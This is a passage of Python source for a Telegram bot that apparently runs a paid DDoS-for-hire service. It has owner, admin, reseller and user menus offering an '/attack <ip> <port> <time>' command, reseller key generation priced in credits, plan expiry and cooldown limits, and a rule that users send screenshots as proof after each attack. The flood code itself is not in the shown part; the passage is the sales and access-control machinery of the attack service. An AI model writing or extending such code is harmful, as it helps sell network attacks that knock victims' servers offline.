                f"• /genkey &lt;dur&gt; &lt;cd&gt; &lt;days&gt; - Master key\n"
                f"• /gentrial &lt;hours&gt; &lt;count&gt; - Trial keys\n"
                f"• /gentrialfor &lt;id&gt; &lt;h&gt; &lt;n&gt; - For reseller\n"
                f"• /deletetrials - Remove trials\n"
                f"• /list_codes - Active codes\n"
                f"• /delete_code &lt;code&gt; - Delete code\n"
                f"• /block_code &lt;code&gt; - Block code\n"
                f"• /key_state &lt;code&gt; - Code info\n\n"
                f"━━━━━━━ <b>SETTINGS</b> ━━━━━━━\n"
                f"• /settime &lt;sec&gt; - Max attack time\n"
                f"• /setcooldown &lt;sec&gt; - Cooldown\n"
                f"• /setconcurrent &lt;num&gt; - Max concurrent\n"
                f"• /setapi &lt;url&gt; &lt;key&gt; - API settings\n"
                f"• /port_protection on/off - Toggle\n"
                f"• /feedback on/off - Feedback system\n"
                f"• /maintenance on/off - Maintenance\n"
                f"• /block_port &lt;ip&gt; &lt;port&gt; - Block port\n"
                f"• /unblock_port &lt;ip&gt; &lt;port&gt; - Unblock\n\n"
                f"━━━━━━━ <b>FEEDBACK MANAGEMENT</b> ━━━━━━━\n"
                f"• /view_feedback - View pending feedback\n"
                f"• /review_feedback &lt;id&gt; - Mark as reviewed\n"
                f"• /feedback_stats - Feedback statistics\n\n"
                f"━━━━━━━ <b>UTILITIES</b> ━━━━━━━\n"
                f"• /state - Full statistics\n"
                f"• /server_stats - Server info\n"
                f"• /broadcast &lt;target&gt; &lt;msg&gt; - Message\n"
                f"• /backup_users - Export data\n"
                f"• /export_data - Full export\n"
                f"• /extend_all_users &lt;sec&gt; - Extend plans\n"
                f"• /deduct_all &lt;sec&gt; - Deduct time\n\n"
                f"━━━━━━━ <b>ATTACK COMMANDS</b> ━━━━━━━\n"
                f"• /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt; - Launch\n"
                f"• /status - Active attacks\n"
                f"• /ping - Bot status\n"
                f"• /getid - Get IDs\n\n"
                f"⚡ <b>Unlimited access to everything!</b>"
            )
        elif is_admin(user_id):
            help_text = (
                f"👮 <b>ADMIN COMMANDS</b> 👮\n"
                f"╔══════════════════════════════╗\n"
                f"║   👮 ADMIN CONTROL          ║\n"
                f"╚══════════════════════════════╝\n\n"
                f"━━━━━━━ <b>GROUP MANAGEMENT</b> ━━━━━━━\n"
                f"• /approve &lt;id&gt; &lt;conc&gt; &lt;time&gt; &lt;cd&gt;\n"
                f"• /disapprove &lt;id&gt;\n"
                f"• /approved_groups\n\n"
                f"━━━━━━━ <b>USER MANAGEMENT</b> ━━━━━━━\n"
                f"• /ban &lt;id&gt; /unban &lt;id&gt;\n"
                f"• /banned_list /users\n"
                f"• /remove &lt;id&gt; /remove_expired\n"
                f"• /reset_user &lt;id&gt;\n"
                f"• /get_user_info &lt;id&gt;\n"
                f"• /set_user_limit &lt;id&gt; &lt;time&gt; &lt;cd&gt;\n\n"
                f"━━━━━━━ <b>RESELLER SYSTEM</b> ━━━━━━━\n"
                f"• /add_reseller &lt;id&gt;\n"
                f"• /remove_reseller &lt;id&gt;\n"
                f"• /resellers\n"
                f"• /addcredit &lt;id&gt; &lt;amount&gt;\n"
                f"• /removecredit &lt;id&gt; &lt;amount&gt;\n"
                f"• /reseller_info &lt;id&gt;\n\n"
                f"━━━━━━━ <b>KEY MANAGEMENT</b> ━━━━━━━\n"
                f"• /genkey &lt;dur&gt; &lt;cd&gt; &lt;days&gt;\n"
                f"• /gentrial &lt;hours&gt; &lt;count&gt;\n"
                f"• /gentrialfor &lt;id&gt; &lt;h&gt; &lt;n&gt;\n"
                f"• /deletetrials\n"
                f"• /list_codes\n"
                f"• /delete_code &lt;code&gt;\n"
                f"• /block_code &lt;code&gt;\n\n"
                f"━━━━━━━ <b>SETTINGS</b> ━━━━━━━\n"
                f"• /settime &lt;sec&gt;\n"
                f"• /setcooldown &lt;sec&gt;\n"
                f"• /setconcurrent &lt;num&gt;\n"
                f"• /setapi &lt;url&gt; &lt;key&gt;\n"
                f"• /port_protection on/off\n"
                f"• /feedback on/off\n"
                f"• /block_port &lt;ip&gt; &lt;port&gt;\n\n"
                f"━━━━━━━ <b>FEEDBACK MANAGEMENT</b> ━━━━━━━\n"
                f"• /view_feedback - View pending feedback\n"
                f"• /review_feedback &lt;id&gt; - Mark as reviewed\n"
                f"• /feedback_stats - Feedback statistics\n\n"
                f"━━━━━━━ <b>UTILITIES</b> ━━━━━━━\n"
                f"• /state - Statistics\n"
                f"• /server_stats - Server\n"
                f"• /broadcast &lt;target&gt; &lt;msg&gt;\n"
                f"• /backup_users - Export\n"
                f"• /extend_all_users &lt;sec&gt;\n\n"
                f"━━━━━━━ <b>ATTACK COMMANDS</b> ━━━━━━━\n"
                f"• /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;\n"
                f"• /status /ping /getid\n\n"
                f"⚡ <b>Full admin access!</b>"
            )
        elif is_reseller(user_id):
            help_text = (
                f"💰 <b>RESELLER COMMANDS</b> 💰\n"
                f"╔══════════════════════════════╗\n"
                f"║   💰 RESELLER PANEL         ║\n"
                f"╚══════════════════════════════╝\n\n"
                f"━━━━━━━ <b>KEY GENERATION</b> ━━━━━━━\n"
                f"• /gen &lt;prefix&gt; &lt;duration&gt; &lt;count&gt;\n"
                f"  Example: /gen VIP 1hr 1\n"
                f"  Duration: 1hr, 6hr, 12hr, 1d, 2d, 3d, 4d, 5d, 6d, 7d, 30d\n\n"
                f"  💰 <b>Pricing:</b>\n"
                f"  • 1hr = 4 credits\n"
                f"  • 6hr = 25 credits\n"
                f"  • 12hr = 50 credits\n"
                f"  • 1d = 100 credits\n"
                f"  • 2d = 200 credits\n"
                f"  • 3d = 300 credits\n"
                f"  • 4d = 400 credits\n"
                f"  • 5d = 500 credits\n"
                f"  • 6d = 600 credits\n"
                f"  • 7d = 700 credits\n"
                f"  • 30d = 3000 credits\n\n"
                f"• /mycredits - Check your credits\n\n"
                f"━━━━━━━ <b>ATTACK COMMANDS</b> ━━━━━━━\n"
                f"• /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;\n"
                f"• /status - Active attacks\n"
                f"• /ping - Bot status\n\n"
                f"━━━━━━━ <b>GENERAL</b> ━━━━━━━\n"
                f"• /start - Start bot\n"
                f"• /help - This menu\n"
                f"• /getid - Get IDs\n"
                f"• /reseller_panel - Your panel\n\n"
                f"⚡ <b>Your keys provide unlimited attacks!</b>"
            )
        elif is_authorized(user_id, chat_id):
            help_text = (
                f"✅ <b>USER COMMANDS</b> ✅\n"
                f"╔══════════════════════════════╗\n"
                f"║   ✅ AUTHORIZED USER        ║\n"
                f"╚══════════════════════════════╝\n\n"
                f"━━━━━━━ <b>ATTACK COMMANDS</b> ━━━━━━━\n"
                f"• /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;\n"
                f"  Launch an attack on target\n"
                f"• /status - View active attacks\n"
                f"  Shows all running attacks\n\n"
                f"━━━━━━━ <b>FEEDBACK</b> ━━━━━━━\n"
                f"• After each attack, send a screenshot/image\n"
                f"• Image can be any screenshot related to the attack\n"
                f"• You must submit feedback to continue using the bot\n\n"
                f"━━━━━━━ <b>GENERAL</b> ━━━━━━━\n"
                f"• /start - Start the bot\n"
                f"• /help - This menu\n"
                f"• /getid - Get your user ID\n"
                f"• /ping - Check bot status\n"
                f"• /check_my_access - View your plan\n"
                f"• /report &lt;msg&gt; - Report issues\n\n"
                f"━━━━━━━ <b>INFO</b> ━━━━━━━\n"
                f"• /group_info - Group details\n\n"
                f"⚡ <b>You have unlimited attacks with your plan!</b>"
            )
        else:
            help_text = (
                f"👋 <b>PUBLIC COMMANDS</b> 👋\n"
                f"╔══════════════════════════════╗\n"
                f"║   🔐 PUBLIC ACCESS          ║\n"
                f"╚══════════════════════════════╝\n\n"
                f"━━━━━━━ <b>GET ACCESS</b> ━━━━━━━\n"
                f"1️⃣ Purchase a key from reseller\n"
                f"2️⃣ Use /redeem YOUR-KEY\n"
                f"3️⃣ Or join an authorized group\n\n"
                f"━━━━━━━ <b>COMMANDS</b> ━━━━━━━\n"
                f"• /start - Start bot\n"
                f"• /help - This menu\n"
                f"• /redeem &lt;code&gt; - Redeem key\n"
                f"• /getid - Get your ID\n\n"
                f"⚡ <b>Get unlimited attacks with an authorized key!</b>"
            )
        
        bot.reply_to(message, help_text)
        
    except Exception as e:
        logger.error(f"Error in help command: {e}")
        log_error(e, user_id=message.from_user.id, command="help")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# GETID COMMAND
@bot.message_handler(commands=['getid', 'id'])
def id_command(message):
    try:
        if not check_access(message):
            return
        
        user_id = message.from_user.id
        chat_id = message.chat.id
        chat_type = message.chat.type
        
        if is_group(message):
            id_text = (
                f"📋 <b>ID Information</b>\n"
                f"╔════════════════════════╗\n"
                f"║   📋 ID DETAILS       ║\n"
                f"╚════════════════════════╝\n\n"
                f"👤 <b>Your User ID:</b> <code>{user_id}</code>\n"
                f"💬 <b>Chat ID:</b> <code>{chat_id}</code>\n"
                f"📱 <b>Chat Type:</b> {chat_type}\n"
                f"📛 <b>Group Name:</b> {html.escape(message.chat.title or 'N/A')}"
            )
        else:
            id_text = (
                f"📋 <b>ID Information</b>\n"
                f"╔════════════════════════╗\n"
                f"║   📋 ID DETAILS       ║\n"
                f"╚════════════════════════╝\n\n"
                f"👤 <b>Your User ID:</b> <code>{user_id}</code>\n"
                f"💬 <b>Chat ID:</b> <code>{chat_id}</code>\n"
                f"📱 <b>Chat Type:</b> {chat_type}"
            )
        
        bot.reply_to(message, id_text)
        
    except Exception as e:
        logger.error(f"Error in getid command: {e}")
        log_error(e, user_id=message.from_user.id, command="getid")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# PING COMMAND
@bot.message_handler(commands=['ping'])
def ping_command(message):
    try:
        if not check_access(message):
            return
        
        start_time = time.time()
        sent = bot.reply_to(message, "🏓 <b>Pong!</b>")
        
        latency = int((time.time() - start_time) * 1000)
        active = get_active_attack_count()
        max_conc = get_setting("max_concurrent_attacks", DEFAULT_MAX_CONCURRENT)
        groups_approved = groups_col.count_documents({})
        private_users = plans_col.count_documents({"expires": {"$gt": datetime.now().isoformat()}})
        maint = get_setting("maintenance_mode", False)
        pending_feedback = get_pending_feedback_count()
        
        start_time_str = get_setting("bot_start_time")
        if start_time_str:
            uptime_seconds = (datetime.now() - datetime.fromisoformat(start_time_str)).total_seconds()
            uptime_str = format_duration(int(uptime_seconds))
        else:
            uptime_str = "Unknown"
        
        ping_text = (
            f"🏓 <b>Pong!</b>\n"
            f"╔════════════════════════╗\n"
            f"║   📊 BOT STATUS       ║\n"
            f"╚════════════════════════╝\n\n"
            f"⚡ <b>Response Time:</b> {latency}ms\n"
            f"🔥 <b>Active Attacks:</b> {active}/{max_conc}\n"
            f"👥 <b>Active Groups:</b> {groups_approved}\n"
            f"👤 <b>Private Users:</b> {private_users}\n"
            f"📸 <b>Pending Feedback:</b> {pending_feedback}\n"
            f"🔄 <b>Uptime:</b> {uptime_str}\n"
            f"🛠️ <b>Maintenance:</b> {'✅ Enabled' if maint else '❌ Disabled'}"
        )
        
        bot.edit_message_text(ping_text, chat_id=message.chat.id, message_id=sent.message_id)
        
    except Exception as e:
        logger.error(f"Error in ping command: {e}")
        log_error(e, user_id=message.from_user.id, command="ping")
        try:
            bot.reply_to(message, "❌ An error occurred. Please try again.")
        except:
            pass

# GROUP INFO COMMAND
@bot.message_handler(commands=['group_info'])
def group_info_command(message):
    try:
        if not is_group(message):
            bot.reply_to(message, "❌ This command can only be used in groups.")
            return
        
        if not check_access(message):
            return
        
        chat = message.chat
        title = html.escape(chat.title) if chat.title else str(chat.id)
        
        info_text = (
            f"📋 <b>Group Info:</b>\n"
            f"╔════════════════════════╗\n"
            f"║   📋 GROUP DETAILS    ║\n"
            f"╚════════════════════════╝\n\n"
            f"📛 <b>Name:</b> {title}\n"
            f"🆔 <b>ID:</b> <code>{chat.id}</code>\n"
            f"👥 <b>Type:</b> {chat.type}"
        )
        
        if chat.username:
            info_text += f"\n🔗 <b>Username:</b> @{html.escape(chat.username)}"
        
        if is_approved_group(chat.id):
            limits = get_group_limits(chat.id)
            info_text += (
                f"\n✅ <b>Status:</b> Approved\n"
                f"📊 <b>Limits:</b>\n"
                f"  • Max Concurrent: {limits[0]}\n"
                f"  • Max Time: {limits[1]}s\n"
                f"  • Cooldown: {limits[2]}s"
            )
        else:
            info_text += "\n❌ <b>Status:</b> Not Approved"
        
        info_text += f"\n👥 <b>Active Attacks:</b> {get_group_active_attacks_count(chat.id)}"
        
        bot.reply_to(message, info_text)
        
    except Exception as e:
        logger.error(f"Error in group_info command: {e}")
        log_error(e, user_id=message.from_user.id, command="group_info")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# CHECK MY ACCESS
@bot.message_handler(commands=['check_my_access'])
def check_my_access(message):
    try:
        if not check_access(message):
            return
        
        user_id = message.from_user.id
        
        if is_group(message):
            if is_approved_group(message.chat.id):
                limits = get_group_limits(message.chat.id)
                access_text = (
                    f"✅ <b>Group Access Verified</b>\n"
                    f"╔════════════════════════╗\n"
                    f"║   ✅ GROUP ACCESS     ║\n"
                    f"╚════════════════════════╝\n\n"
                    f"👥 <b>Group:</b> {html.escape(message.chat.title or 'Unknown')}\n"
                    f"📊 <b>Group Limits:</b>\n"
                    f"  • Max Concurrent: {limits[0]}\n"
                    f"  • Max Time: {limits[1]}s\n"
                    f"  • Cooldown: {limits[2]}s\n\n"
                    f"⚡ <b>Unlimited attacks in this group!</b>"
                )
            else:
                access_text = "❌ This group is not approved."
            
            bot.reply_to(message, access_text)
            return
        
        if is_owner(user_id):
            access_text = (
                f"👑 <b>Owner Access</b>\n"
                f"╔════════════════════════╗\n"
                f"║   👑 OWNER ACCESS     ║\n"
                f"╚════════════════════════╝\n\n"
                f"⚡ <b>Unlimited access to all features!</b>\n"
                f"🎯 <b>Unlimited attacks</b>\n"
                f"⏱️ <b>No time restrictions</b>\n"
                f"⏳ <b>No cooldown</b>\n"
                f"📸 <b>No feedback required</b>"
            )
        elif is_admin(user_id):
            access_text = (
                f"👮 <b>Admin Access</b>\n"
                f"╔════════════════════════╗\n"
                f"║   👮 ADMIN ACCESS     ║\n"
                f"╚════════════════════════╝\n\n"
                f"⚡ <b>Unlimited access to admin features!</b>\n"
                f"🎯 <b>Unlimited attacks</b>\n"
                f"⏱️ <b>No time restrictions</b>\n"
                f"⏳ <b>No cooldown</b>\n"
                f"📸 <b>No feedback required</b>"
            )
        elif is_reseller(user_id):
            reseller = resellers_col.find_one({"_id": str(user_id)})
            credits = reseller.get("credits", 0) if reseller else 0
            access_text = (
                f"💰 <b>Reseller Access</b>\n"
                f"╔════════════════════════╗\n"
                f"║   💰 RESELLER ACCESS  ║\n"
                f"╚════════════════════════╝\n\n"
                f"💳 <b>Credits:</b> {credits}\n"
                f"🎯 <b>Unlimited attacks</b>\n"
                f"🔑 <b>Generate keys for users</b>\n"
                f"📸 <b>No feedback required</b>"
            )
        else:
            plan = plans_col.find_one({"_id": str(user_id)})
            if not plan:
                access_text = (
                    f"❌ <b>No Active Plan</b>\n\n"
                    f"Purchase a key and use /redeem to get access.\n"
                    f"All plans include unlimited attacks!"
                )
            else:
                expires = datetime.fromisoformat(plan["expires"])
                now = datetime.now()
                if now > expires:
                    access_text = (
                        f"❌ <b>Plan Expired</b>\n\n"
                        f"Your plan has expired. Please redeem a new key."
                    )
                else:
                    remaining_time = expires - now
                    days = remaining_time.days
                    hours = remaining_time.seconds // 3600
                    minutes = (remaining_time.seconds % 3600) // 60
                    
                    access_text = (
                        f"✅ <b>Your Plan Details</b>\n"
                        f"╔════════════════════════╗\n"
                        f"║   ✅ ACTIVE PLAN      ║\n"
                        f"╚════════════════════════╝\n\n"
                        f"🎯 <b>Attacks:</b> Unlimited\n"
                        f"⏱️ <b>Max Duration:</b> {plan['max_duration']}s\n"
                        f"⏳ <b>Cooldown:</b> {plan['cooldown']}s\n"
                        f"📅 <b>Expires in:</b> {days}d {hours}h {minutes}m\n"
                        f"📅 <b>Expiry Date:</b> {format_expiry(expires)}\n\n"
                        f"📸 <b>Feedback:</b> Required after each attack\n"
                        f"⚡ <b>Unlimited attacks until expiration!</b>"
                    )
        
        bot.reply_to(message, access_text)
        
    except Exception as e:
        logger.error(f"Error in check_my_access command: {e}")
        log_error(e, user_id=message.from_user.id, command="check_my_access")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= HANDLE FEEDBACK IMAGES =================
@bot.message_handler(content_types=['photo', 'document'])
def handle_feedback_image(message):
    try:
        user_id = message.from_user.id
        
        if not has_pending_feedback(user_id):
            return
        
        if not check_access(message):
            return
        
        if message.photo:
            file_id = message.photo[-1].file_id
            file_type = "photo"
        elif message.document:
            mime_type = message.document.mime_type
            if mime_type and mime_type.startswith('image/'):
                file_id = message.document.file_id
                file_type = "document_image"
            else:
                bot.reply_to(message, "❌ Please send an image/screenshot file.\n\n"
                             "Supported formats: JPG, PNG, GIF")
                return
        else:
            bot.reply_to(message, "❌ Please send an image/screenshot.\n\n"
                         "Send a photo or image file.")
            return
        
        pending = pending_feedback_col.find_one({"_id": str(user_id)})
        attack_data = pending.get("attack_data", {}) if pending else {}
        
        save_feedback_submission(
            user_id, 
            file_id, 
            file_type, 
            message.caption or "", 
            attack_data
        )
        
        clear_pending_feedback(user_id)
        
        try:
            caption = (
                f"📸 <b>New Feedback Submission</b>\n"
                f"╔════════════════════════╗\n"
                f"║   📸 USER FEEDBACK     ║\n"
                f"╚════════════════════════╝\n\n"
                f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
                f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            )
            
            if attack_data:
                caption += (
                    f"\n📋 <b>Attack Details:</b>\n"
                    f"🎯 Target: {attack_data.get('target', 'N/A')}\n"
                    f"🔌 Port: {attack_data.get('port', 'N/A')}\n"
                    f"⏱ Duration: {attack_data.get('duration', 'N/A')}s\n"
                )
            
            if message.caption:
                caption += f"\n📝 <b>Caption:</b>\n{html.escape(message.caption)}"
            
            if file_type == "photo":
                bot.send_photo(BOT_OWNER, file_id, caption=caption, parse_mode='HTML')
            else:
                bot.send_document(BOT_OWNER, file_id, caption=caption, parse_mode='HTML')
                
        except Exception as e:
            logger.error(f"Error forwarding feedback to owner: {e}")
        
        bot.reply_to(message, 
                    f"✅ <b>Feedback Submitted!</b>\n"
                    f"╔════════════════════════╗\n"
                    f"║   ✅ FEEDBACK SENT    ║\n"
                    f"╚════════════════════════╝\n\n"
                    f"📸 Thank you for your feedback!\n"
                    f"Your screenshot has been sent to the admin.\n\n"
                    f"🔄 You can now start another attack.\n"
                    f"Use /attack to launch your next attack!")
        
    except Exception as e:
        logger.error(f"Error handling feedback image: {e}")
        log_error(e, user_id=message.from_user.id, command="feedback_image")
        try:
            bot.reply_to(message, "❌ An error occurred while processing your feedback. Please try again.")
        except:
            pass

# ================= RESELLER COMMANDS =================

@bot.message_handler(commands=['reseller_panel'])
def reseller_panel_cmd(message):
    try:
        if not check_access(message):
            return
        
        user_id = message.from_user.id
        
        if not is_reseller(user_id) and not is_owner(user_id):
            bot.reply_to(message, "❌ Only resellers can access this panel.")
            return
        
        reseller = resellers_col.find_one({"_id": str(user_id)})
        credits = reseller.get("credits", 0) if reseller else 0
        if is_owner(user_id):
            credits = "Unlimited"
        
        active_keys = keys_col.count_documents({
            "created_by": user_id, 
            "redeemed_by": None, 
            "expires": {"$gt": datetime.now().isoformat()}
        })
        redeemed_keys = keys_col.count_documents({
            "created_by": user_id, 
            "redeemed_by": {"$ne": None}
        })
        
        panel_text = (
            f"💰 <b>RESELLER PANEL</b> 💰\n"
            f"╔════════════════════════╗\n"
            f"║   💰 RESELLER ONLY    ║\n"
            f"╚════════════════════════╝\n\n"
            f"━━━━━━━ <b>YOUR STATS</b> ━━━━━━━\n"
            f"💳 <b>Credits:</b> {credits}\n"
            f"🔑 <b>Active Keys:</b> {active_keys}\n"
            f"✅ <b>Redeemed Keys:</b> {redeemed_keys}\n\n"
            f"━━━━━━━ <b>KEY GENERATION</b> ━━━━━━━\n"
            f"• /gen &lt;prefix&gt; &lt;duration&gt; &lt;count&gt;\n"
            f"  Example: /gen VIP 1hr 1\n"
            f"  Duration: 1hr, 6hr, 12hr, 1d, 2d, 3d, 4d, 5d, 6d, 7d, 30d\n\n"
            f"  💰 <b>Pricing:</b>\n"
            f"  • 1hr = 4 credits\n"
            f"  • 6hr = 25 credits\n"
            f"  • 12hr = 50 credits\n"
            f"  • 1d = 100 credits\n"
            f"  • 2d = 200 credits\n"
            f"  • 3d = 300 credits\n"
            f"  • 4d = 400 credits\n"
            f"  • 5d = 500 credits\n"
            f"  • 6d = 600 credits\n"
            f"  • 7d = 700 credits\n"
            f"  • 30d = 3000 credits\n\n"
            f"• /mycredits - Check your credits\n"
            f"• All generated keys have unlimited attacks\n\n"
            f"━━━━━━━ <b>ATTACK COMMANDS</b> ━━━━━━━\n"
            f"• /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;\n"
            f"• /status - Active attacks\n"
            f"• /ping - Bot status\n\n"
            f"━━━━━━━ <b>GENERAL</b> ━━━━━━━\n"
            f"• /start - Start bot\n"
            f"• /help - Help menu\n"
            f"• /getid - Get IDs\n\n"
            f"⚡ <b>Your keys have unlimited attacks!</b>"
        )
        
        bot.reply_to(message, panel_text)
        
    except Exception as e:
        logger.error(f"Error in reseller_panel command: {e}")
        log_error(e, user_id=message.from_user.id, command="reseller_panel")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

@bot.message_handler(commands=['mycredits', 'mycredit'])
def mycredit_cmd(message):
    try:
        if not check_access(message):
            return
        
        user_id = message.from_user.id
        
        if not is_reseller(user_id) and not is_owner(user_id):
            bot.reply_to(message, "❌ You are not a reseller.")
            return
        
        if is_owner(user_id):
            bot.reply_to(message, "👑 <b>Owner Credits:</b> Unlimited\n\nYou have unlimited credits as the bot owner.")
            return
        
        reseller = resellers_col.find_one({"_id": str(user_id)})
        credits = reseller.get("credits", 0) if reseller else 0
        
        credit_text = (
            f"💳 <b>Your Credits</b>\n"
            f"╔════════════════════════╗\n"
            f"║   💳 CREDIT BALANCE   ║\n"
            f"╚════════════════════════╝\n\n"
            f"💰 <b>Balance:</b> {credits} credits\n\n"
            f"━━━━━━━ <b>PRICING</b> ━━━━━━━\n"
            f"⏰ <b>Hours:</b>\n"
            f"  • 1hr = 4 credits\n"
            f"  • 6hr = 25 credits\n"
            f"  • 12hr = 50 credits\n\n"
            f"📅 <b>Days:</b>\n"
            f"  • 1d = 100 credits\n"
            f"  • 2d = 200 credits\n"
            f"  • 3d = 300 credits\n"
            f"  • 4d = 400 credits\n"
            f"  • 5d = 500 credits\n"
            f"  • 6d = 600 credits\n"
            f"  • 7d = 700 credits\n"
            f"  • 30d = 3000 credits\n\n"
            f"💡 Use /gen to create keys"
        )
        
        bot.reply_to(message, credit_text)
        
    except Exception as e:
        logger.error(f"Error in mycredits command: {e}")
        log_error(e, user_id=message.from_user.id, command="mycredits")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

@bot.message_handler(commands=['gen'])
def gen_reseller(message):
    try:
        if not check_access(message):
            return
        
        user_id = message.from_user.id
        
        if not is_reseller(user_id) and not is_admin_or_owner(user_id):
            bot.reply_to(message, "❌ Only resellers or admins can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, 
                        "⚠️ <b>Usage:</b> /gen &lt;prefix&gt; &lt;duration&gt; &lt;count&gt;\n\n"
                        "📋 <b>Example:</b> /gen VIP 1hr 1\n\n"
                        "⏰ <b>Duration Options:</b>\n"
                        "• 1hr  • 6hr  • 12hr\n"
                        "• 1d   • 2d   • 3d\n"
                        "• 4d   • 5d   • 6d\n"
                        "• 7d   • 30d\n\n"
                        "💰 <b>Pricing:</b>\n"
                        "• 1hr = 4 credits\n"
                        "• 6hr = 25 credits\n"
                        "• 12hr = 50 credits\n"
                        "• 1d = 100 credits\n"
                        "• 2d = 200 credits\n"
                        "• 3d = 300 credits\n"
                        "• 4d = 400 credits\n"
                        "• 5d = 500 credits\n"
                        "• 6d = 600 credits\n"
                        "• 7d = 700 credits\n"
                        "• 30d = 3000 credits")
            return
        
        prefix = parts[1].upper()
        duration_str = parts[2].lower()
        try:
            count = int(parts[3])
        except ValueError:
            bot.reply_to(message, "❌ Count must be a number.")
            return
        
        if count < 1 or count > 100:
            bot.reply_to(message, "❌ Count must be between 1 and 100.")
            return
        
        hours = None
        days = None
        
        if duration_str.endswith('hr') or duration_str.endswith('h'):
            try:
                hours = int(duration_str.replace('hr', '').replace('h', '').strip())
                if hours not in [1, 6, 12]:
                    bot.reply_to(message, "❌ Invalid hours. Allowed: 1, 6, 12")
                    return
            except:
                bot.reply_to(message, "❌ Invalid duration format.")
                return
        
        elif duration_str.endswith('d') or duration_str.endswith('day'):
            try:
                days = int(duration_str.replace('d', '').replace('day', '').strip())
                if days not in [1, 2, 3, 4, 5, 6, 7, 30]:
                    bot.reply_to(message, "❌ Invalid days. Allowed: 1, 2, 3, 4, 5, 6, 7, 30")
                    return
            except:
                bot.reply_to(message, "❌ Invalid duration format.")
                return
        
        else:
            bot.reply_to(message, "❌ Invalid duration. Use format like '1hr', '6hr', '1d', '30d'")
            return
        
        price = get_price(hours=hours, days=days)
        if price is None:
            bot.reply_to(message, "❌ Invalid duration or pricing not available.")
            return
        
        total_cost = price * count
        
        if not is_admin_or_owner(user_id):
            reseller = resellers_col.find_one({"_id": str(user_id)})
            credits = reseller.get("credits", 0) if reseller else 0
            
            if credits < total_cost:
                bot.reply_to(message, 
                            f"❌ <b>Insufficient Credits</b>\n\n"
                            f"💰 Your balance: {credits}\n"
                            f"💳 Required: {total_cost}\n"
                            f"📊 {price} credits × {count} keys = {total_cost}\n\n"
                            f"📋 Pricing for {duration_str}:\n"
                            f"• {price} credits per key\n\n"
                            f"Use /mycredits to check your balance.")
                return
            
            resellers_col.update_one(
                {"_id": str(user_id)}, 
                {"$inc": {"credits": -total_cost}}
            )
        
        if hours:
            expires = datetime.now() + timedelta(hours=hours)
            duration_label = f"{hours} hour(s)"
            duration_hours = hours
        else:
            expires = datetime.now() + timedelta(days=days)
            duration_label = f"{days} day(s)"
            duration_hours = days * 24
        
        codes = []
        
        for _ in range(count):
            code = generate_code(prefix, 12)
            keys_col.insert_one({
                "_id": code,
                "type": "reseller_unlimited",
                "attacks_left": -1,
                "max_duration": get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME),
                "cooldown": get_setting("cooldown", DEFAULT_COOLDOWN),
                "expires": expires.isoformat(),
                "created_by": user_id,
                "redeemed_by": None,
                "redeemed_at": None,
                "trial": False,
                "created_at": datetime.now().isoformat(),
                "duration_hours": duration_hours,
                "duration_label": duration_label,
                "prefix": prefix
            })
            codes.append(code)
            log_key_event("generated", code, created_by=user_id, extra=f"prefix={prefix}, duration={duration_label}, unlimited")
        
        code_list = "\n".join([f"<code>{code}</code>" for code in codes])
        remaining = ""
        if not is_admin_or_owner(user_id):
            new_credits = resellers_col.find_one({"_id": str(user_id)})["credits"]
            remaining = f"\n💳 <b>Credits Remaining:</b> {new_credits}"
        
        response_text = (
            f"✅ <b>Keys Generated Successfully!</b>\n"
            f"╔════════════════════════╗\n"
            f"║   ✅ KEYS CREATED     ║\n"
            f"╚════════════════════════╝\n\n"
            f"━━━━━━━ <b>DETAILS</b> ━━━━━━━\n"
            f"📏 <b>Count:</b> {count} key(s)\n"
            f"⏳ <b>Duration:</b> {duration_label}\n"
            f"📅 <b>Expires:</b> {format_expiry(expires)}\n"
            f"🎯 <b>Attacks:</b> Unlimited\n"
            f"📝 <b>Prefix:</b> {prefix}\n"
            f"💰 <b>Cost:</b> {total_cost} credits ({price} credits per key)\n"
            f"{remaining}\n\n"
            f"━━━━━━━ <b>KEYS</b> ━━━━━━━\n"
            f"{code_list}\n\n"
            f"💡 Share these keys with your customers!\n"
            f"📋 Users redeem with: /redeem CODE"
        )
        
        bot.reply_to(message, response_text)
        
    except Exception as e:
        logger.error(f"Error in gen command: {e}")
        log_error(e, user_id=message.from_user.id, command="gen")
        bot.reply_to(message, "❌ An error occurred while generating keys. Please try again.")

# ================= ADD RESELLER COMMAND =================
@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can add resellers.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /add_reseller &lt;user_id&gt;")
            return
        
        try:
            user_id = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Invalid user ID.")
            return
        
        if is_reseller(user_id):
            bot.reply_to(message, f"⚠️ User {user_id} is already a reseller.")
            return
        
        if is_owner(user_id):
            bot.reply_to(message, "❌ The owner is already a reseller by default.")
            return
        
        resellers_col.insert_one({
            "_id": str(user_id),
            "added_by": message.from_user.id,
            "added_at": datetime.now().isoformat(),
            "credits": 0,
            "total_generated": 0,
            "total_redeemed": 0
        })
        
        log_admin_action(message.from_user.id, "add_reseller", f"Added reseller {user_id}")
        
        bot.reply_to(message, 
                    f"✅ <b>Reseller Added</b>\n\n"
                    f"User ID: <code>{user_id}</code>\n"
                    f"Added by: {message.from_user.id}\n"
                    f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    f"💡 Use /addcredit {user_id} &lt;amount&gt; to add credits.")
        
        try:
            bot.send_message(user_id, 
                           f"💰 <b>You're Now a Reseller!</b>\n\n"
                           f"You have been added as a reseller.\n"
                           f"Use /reseller_panel to access your panel.\n"
                           f"Use /gen to generate keys.")
        except:
            pass
        
    except Exception as e:
